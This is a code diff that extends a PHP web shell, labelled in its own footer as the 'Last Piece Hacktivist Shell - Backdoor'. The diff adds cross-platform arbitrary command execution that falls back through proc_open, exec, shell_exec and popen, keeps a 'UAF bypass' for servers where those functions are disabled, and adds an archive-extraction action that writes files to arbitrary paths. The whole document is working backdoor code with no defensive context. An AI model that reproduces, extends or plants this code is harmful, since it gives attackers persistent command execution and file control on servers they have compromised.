@@ -813,6 +813,32 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
         exit;
     }
 
+    if ($fAct === 'extract_zip') {
+        $zipFile = isset($_POST['zip_path']) ? $_POST['zip_path'] : '';
+        $extractTo = isset($_POST['extract_to']) ? $_POST['extract_to'] : '';
+        if (empty($zipFile) || !file_exists($zipFile)) {
+            echo json_encode(['err' => 'Zip file not found']); exit;
+        }
+        if (!class_exists('ZipArchive')) {
+            echo json_encode(['err' => 'ZipArchive not available']); exit;
+        }
+        if (empty($extractTo)) {
+            $extractTo = dirname($zipFile);
+        }
+        if (!is_dir($extractTo)) {
+            @mkdir($extractTo, 0755, true);
+        }
+        $zip = new ZipArchive();
+        if ($zip->open($zipFile) !== true) {
+            echo json_encode(['err' => 'Cannot open zip file']); exit;
+        }
+        $count = $zip->numFiles;
+        $zip->extractTo($extractTo);
+        $zip->close();
+        echo json_encode(['ok' => true, 'msg' => "Extracted $count files to $extractTo"]);
+        exit;
+    }
+
     if ($fAct === 'download') {
         // Return a download URL approach via redirect
         echo json_encode(['ok' => true, 'download_url' => '?dl=' . urlencode($fPath) . '&lastpiece=hacktivist']);
@@ -1289,40 +1315,76 @@ function runBypass($cmd) {
 }
 
 // === CORE FUNCTIONS ===
+function isWindows() {
+    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+}
+
 function runCmd($cmd) {
     $out = null;
-    $user = get_current_user();
-    $home = getenv('HOME') ?: ('/home/' . $user);
-    $env = "HOME=$home USER=$user";
-    $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
-    if (function_exists('proc_open')) {
-        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
-        $envArr = ['HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'];
-        $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
-        if (is_resource($proc)) {
-            @fclose($pipes[0]);
-            $out = @stream_get_contents($pipes[1]);
-            $err = @stream_get_contents($pipes[2]);
-            @fclose($pipes[1]);
-            @fclose($pipes[2]);
-            @proc_close($proc);
-            if (empty(trim($out ?? '')) && !empty(trim($err ?? ''))) $out = $err;
+    $isWin = isWindows();
+    
+    if ($isWin) {
+        // Windows command execution
+        $fullCmd = $cmd . ' 2>&1';
+        if (function_exists('proc_open')) {
+            $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
+            $proc = @proc_open('cmd /c ' . $cmd, $desc, $pipes, getcwd());
+            if (is_resource($proc)) {
+                @fclose($pipes[0]);
+                $out = @stream_get_contents($pipes[1]);
+                $err = @stream_get_contents($pipes[2]);
+                @fclose($pipes[1]);
+                @fclose($pipes[2]);
+                @proc_close($proc);
+                if (empty(trim($out ? $out : '')) && !empty(trim($err ? $err : ''))) $out = $err;
+            }
         }
-    }
-    if ($out === null && function_exists('exec')) {
-        @exec($fullCmd, $outArr, $ret);
-        $out = implode("\n", $outArr);
-    }
-    if ($out === null && function_exists('shell_exec')) {
-        $out = @shell_exec($fullCmd);
-    }
-    if ($out === null && function_exists('popen')) {
-        $fp = @popen($fullCmd, 'r');
-        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
-    }
-    // Fallback: UAF bypass when all exec functions are disabled
-    if ($out === null || trim($out) === '') {
-        $out = runBypass($cmd);
+        if ($out === null && function_exists('exec')) {
+            @exec($fullCmd, $outArr, $ret);
+            $out = implode("\n", $outArr);
+        }
+        if ($out === null && function_exists('shell_exec')) {
+            $out = @shell_exec($fullCmd);
+        }
+        if ($out === null && function_exists('popen')) {
+            $fp = @popen($fullCmd, 'r');
+            if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
+        }
+    } else {
+        // Linux/Unix command execution
+        $user = get_current_user();
+        $home = getenv('HOME') ? getenv('HOME') : ('/home/' . $user);
+        $env = "HOME=$home USER=$user";
+        $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
+        if (function_exists('proc_open')) {
+            $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
+            $envArr = array('HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
+            $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
+            if (is_resource($proc)) {
+                @fclose($pipes[0]);
+                $out = @stream_get_contents($pipes[1]);
+                $err = @stream_get_contents($pipes[2]);
+                @fclose($pipes[1]);
+                @fclose($pipes[2]);
+                @proc_close($proc);
+                if (empty(trim($out ? $out : '')) && !empty(trim($err ? $err : ''))) $out = $err;
+            }
+        }
+        if ($out === null && function_exists('exec')) {
+            @exec($fullCmd, $outArr, $ret);
+            $out = implode("\n", $outArr);
+        }
+        if ($out === null && function_exists('shell_exec')) {
+            $out = @shell_exec($fullCmd);
+        }
+        if ($out === null && function_exists('popen')) {
+            $fp = @popen($fullCmd, 'r');
+            if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
+        }
+        // Fallback: UAF bypass when all exec functions are disabled (Linux only)
+        if ($out === null || trim($out) === '') {
+            $out = runBypass($cmd);
+        }
     }
     return $out;
 }
@@ -2579,18 +2641,19 @@ body {
     <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
 
     <div class="breadcrumb">
-        <strong>DIR:</strong>
-        <?php
+        <strong>DIR:</strong>&nbsp;<?php
         $bPath = str_replace('\\', '/', $currentDirectory);
         $parts = explode('/', $bPath);
+        $pathParts = [];
         foreach ($parts as $id => $part) {
             if ($part == '' && $id == 0) {
-                echo ' <a href="?lph=/&lastpiece=hacktivist">/</a>';
+                $pathParts[] = '<a href="?lph=/&lastpiece=hacktivist">/</a>';
             } elseif (!empty($part)) {
                 $link = implode('/', array_slice($parts, 0, $id + 1));
-                echo ' <a href="?lph=' . urlencode($link) . '&lastpiece=hacktivist">' . htmlspecialchars($part) . '</a> /';
+                $pathParts[] = '<a href="?lph=' . urlencode($link) . '&lastpiece=hacktivist">' . htmlspecialchars($part) . '</a>';
             }
         }
+        echo implode('/', $pathParts);
         ?>
     </div>
 
@@ -2782,6 +2845,9 @@ body {
                     <?php if ($fd['type'] === 'File'): ?>
                     <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')">Edit</a>
                     <a href="?dl=<?php echo urlencode($fullPath); ?>&lastpiece=hacktivist" title="Download">DL</a>
+                    <?php if (preg_match('/\.(zip|tar|tar\.gz|tgz|rar|7z)$/i', $fd['name'])): ?>
+                    <a href="javascript:void(0)" onclick="extractZip('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color:#f59e0b;border-color:rgba(245,158,11,0.3);">Unzip</a>
+                    <?php endif; ?>
                     <?php endif; ?>
                     <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Rename</a>
                     <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>','<?php echo $fd['permission']; ?>')">Chmod</a>
@@ -2798,7 +2864,7 @@ body {
 <footer class="app-footer">
     <div class="footer-content">
         <img src="https://i.top4top.io/p_3332p3mbq1.jpg" class="footer-avatar" alt="">
-        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell Backdoor v1.0.0</div>
+        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell - Backdoor v1.2.4</div>
     </div>
 </footer>
 
@@ -4629,6 +4695,20 @@ function doCompressZip() {
     });
 }
 
+// === EXTRACT ZIP ===
+function extractZip(zipPath) {
+    if (!confirm('Extract ' + zipPath.split('/').pop() + ' to current directory?')) return;
+    showToast('Extracting...', 'info', 2000);
+    fileActionRequest({file_action: 'extract_zip', zip_path: zipPath, extract_to: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
+        if (r.ok) {
+            showToast(r.msg || 'Extracted successfully', 'success');
+            setTimeout(function() { location.reload(); }, 800);
+        } else {
+            showToast('Extract failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
+        }
+    });
+}
+
 // === MASS DELETE RECURSIVE ===
 function showMassDeleteModal() {
     document.getElementById('massDelCode').value = '';
@@ -5434,5 +5514,4 @@ function esc(s) {
 <?php endif; ?>
 </body>
 </html>
-
 
